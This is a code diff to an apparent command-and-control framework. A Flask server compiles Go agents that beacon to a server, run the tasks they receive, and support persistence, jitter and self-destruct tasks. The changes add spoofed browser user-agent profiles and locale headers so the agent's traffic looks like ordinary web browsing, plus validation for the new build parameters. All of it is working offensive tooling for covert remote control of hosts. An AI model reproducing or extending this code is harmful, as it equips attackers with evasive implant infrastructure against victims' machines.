@@ -171,7 +171,7 @@ def submit_result():
     conn.execute("UPDATE tasks SET status = 'complete' WHERE id = ?", (data["task_id"],))
     conn.commit()
 
-    # Check if this was a self-destruct task — auto-clean the agent
+    # Check if this was a self-destruct task (auto-clean the agent)
     task = conn.execute(
         "SELECT agent_id, command FROM tasks WHERE id = ?", (data["task_id"],)
     ).fetchone()
@@ -332,7 +332,7 @@ def _sanitize_interval(interval_str):
     return interval_str.strip()
 
 
-def _generate_config_go(server_url, jitter_min, jitter_max, persistence):
+def _generate_config_go(server_url, jitter_min, jitter_max, persistence, profile_id=1, locale="en-US,en;q=0.9"):
     """Generate a config.go file with the given settings."""
 
     return f'''package main
@@ -340,9 +340,12 @@ def _generate_config_go(server_url, jitter_min, jitter_max, persistence):
 import (
 \t"crypto/rand"
 \t"fmt"
+\t"net/http"
 \t"os"
 \t"runtime"
 \t"time"
+
+\t"c2-agent/funcs"
 )
 
 // ─── Configuration ───
@@ -351,6 +354,8 @@ var (
 \tServerURL     = "{server_url}"
 \tJitterMin     = {jitter_min} * time.Second
 \tJitterMax     = {jitter_max} * time.Second
+\tProfileID     = {profile_id}
+\tLocale        = "{locale}"
 \tAgentID       string
 \tEnablePersist = {str(persistence).lower()}
 )
@@ -366,12 +371,28 @@ func generateUUID() string {{
 func InitConfig() {{
 \tAgentID = generateUUID()
 
+\tprofile, ok := funcs.Profiles[ProfileID]
+\tif !ok {{
+\t\tprofile = funcs.Profiles[1]
+\t}}
+
+\tprofile.Headers["Accept-Language"] = Locale
+
+\thttp.DefaultClient = &http.Client{{
+\t\tTransport: &funcs.UATransport{{
+\t\t\tBase:    http.DefaultTransport,
+\t\t\tProfile: profile,
+\t\t}},
+\t}}
+
 \tfmt.Println("═══════════════════════════════════════")
-\tfmt.Println("       C2 Agent — Initialized          ")
+\tfmt.Println("       C2 Agent - Initialized          ")
 \tfmt.Println("═══════════════════════════════════════")
 \tfmt.Printf("  Agent ID  : %s\\n", AgentID)
 \tfmt.Printf("  Server    : %s\\n", ServerURL)
-\tfmt.Printf("  Jitter    : %s – %s\\n", JitterMin, JitterMax)
+\tfmt.Printf("  Jitter    : %s - %s\\n", JitterMin, JitterMax)
+\tfmt.Printf("  Profile   : %s\\n", profile.Name)
+\tfmt.Printf("  Locale    : %s\\n", Locale)
 \tfmt.Printf("  OS/Arch   : %s/%s\\n", runtime.GOOS, runtime.GOARCH)
 
 \thostname, err := os.Hostname()
@@ -451,7 +472,7 @@ func main() {{
 \t\t\tcontinue
 \t\t}}
 
-\t\tfmt.Printf("[+] Checked in — %d pending task(s)\\n", len(tasks))
+\t\tfmt.Printf("[+] Checked in - %d pending task(s)\\n", len(tasks))
 
 \t\tfor _, task := range tasks {{
 \t\t\tfmt.Printf("[>] Executing task #%d: %s\\n", task.ID, task.Command)
@@ -595,6 +616,8 @@ def build_agent():
     jitter_min_raw = data.get("jitter_min", "8")
     jitter_max_raw = data.get("jitter_max", "15")
     persistence = data.get("persistence", False)
+    profile_id = data.get("profile_id", 1)
+    locale = data.get("locale", "en-US,en;q=0.9")
 
     # Validate target OS
     valid_os = ["windows", "linux", "mac"]
@@ -629,6 +652,19 @@ def build_agent():
     if not server_url.startswith("http://") and not server_url.startswith("https://"):
         return jsonify({"error": "Server URL must start with http:// or https://"}), 400
 
+    # Validate profile_id
+    try:
+        profile_id = int(profile_id)
+        if profile_id < 1 or profile_id > 5:
+            return jsonify({"error": "profile_id must be between 1 and 5"}), 400
+    except (ValueError, TypeError):
+        return jsonify({"error": "profile_id must be a number (1-5)"}), 400
+
+    # Sanitize locale (basic validation: allow alphanumerics, dashes, commas, semicolons, equals, periods)
+    import re as _re
+    if not _re.match(r'^[a-zA-Z0-9\-,;=. ]+$', locale):
+        return jsonify({"error": "Invalid locale format"}), 400
+
     # Build filename
     ext = ".exe" if target_os == "windows" else ""
     filename = f"agent_{target_os}_{arch}{ext}"
@@ -643,7 +679,7 @@ def build_agent():
         shutil.copytree(agent_src, tmp_agent)
 
         # Generate custom config.go
-        config_content = _generate_config_go(server_url, jitter_min, jitter_max, persistence)
+        config_content = _generate_config_go(server_url, jitter_min, jitter_max, persistence, profile_id, locale)
         with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
             f.write(config_content)
 
